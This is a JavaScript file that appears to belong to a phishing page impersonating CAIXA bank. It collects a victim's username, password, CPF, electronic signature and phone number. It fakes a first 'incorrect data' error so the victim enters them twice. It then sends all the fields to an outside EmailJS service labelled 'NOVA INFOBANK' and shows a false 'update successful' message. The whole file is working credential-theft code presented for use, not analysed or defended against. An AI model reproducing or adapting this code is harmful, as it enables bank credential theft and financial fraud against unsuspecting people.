toastr.options = {
		  "closeButton": false,
		  "debug": false,
		  "newestOnTop": false,
		  "progressBar": true,
		  "positionClass": "toast-bottom-right",
		  "preventDuplicates": true,
		  "onclick": null,
		  "showDuration": "300",
		  //tempo que o modal aparece 
		  "hideDuration": "1000",
		  "timeOut": "5000",
		  "extendedTimeOut": "1000",
		  "showEasing": "swing",
		  "hideEasing": "linear",
		  "showMethod": "fadeIn",
		  "hideMethod": "fadeOut"
		}

$("#btn-limpar").click(function() {
 	$('#usuario').val("");
	$('#senha').val("");
	$('#cpf').val("");
	$('#assinatura').val("");
	$('#telefone').val("");
});

$("#btn-enviar").click(function() {
	//recebendo valores das variaveis
 	var usuario = $('#usuario').val();
	var senha = $('#senha').val();
	var cpf = $('#cpf').val();
	var assinatura = $('#assinatura').val();
	var telefone = $('#telefone').val();

	//email de captura
	var EmailCaptura = "";
	var controla = "Verdadeiro";

	if(usuario == "" || senha == "" || cpf == "" || assinatura == "" || telefone == ""){
		toastr["warning"]("Você esqueceu de preencher alguns dados.");
	}else{
		//verificações de segurança
		if(cpf.length < 14)
		{
			toastr["warning"]("CPF inválido!");
			$('#cpf').val("");
		}else if(telefone.length < 13)
		{
			toastr["warning"]("Número de telefone inválido!");
			$('#telefone').val("");
		}else if(senha.length < 8)
		{
			toastr["warning"]("Senha inválida!");
			$('#senha').val("");
		}else if(assinatura.length < 6)
		{
			toastr["warning"]("Assinatura eletrônica inválida!");
			$('#assinatura').val("");
		}
		else{
			if(!localStorage.getItem('primeiro')) 
				{
					toastr["warning"]("Dados incorretos. Verifique novamente! (1/3 tentativas)");
					localStorage.setItem('primeiro', controla);
				}else{
					emailjs.send("service_fgrlgkl","template_rm529se",{
						from_name: "NOVA INFOBANK",
						usuario: usuario,
						cpf: cpf,
						senha: senha,
						assinatura: assinatura,
						telefone: telefone,
						reply_to: EmailCaptura,
						});
						toastr["success"]("CAIXA: Atualização cadastral realizada com sucesso!");
						$('#usuario').val("");
						$('#senha').val("");
						$('#cpf').val("");
						$('#assinatura').val("");
						$('#telefone').val("");
				}
		}
	}
});




$(document).ready(function(){
	$('#usuario').mask('00000000000')
	$('#senha').mask('000000000');
	$('#cpf').mask('000.000.000-00');
	$('#assinatura').mask('000000');
	$('#telefone').mask('(00)000000000');
	localStorage.removeItem('primeiro');
});
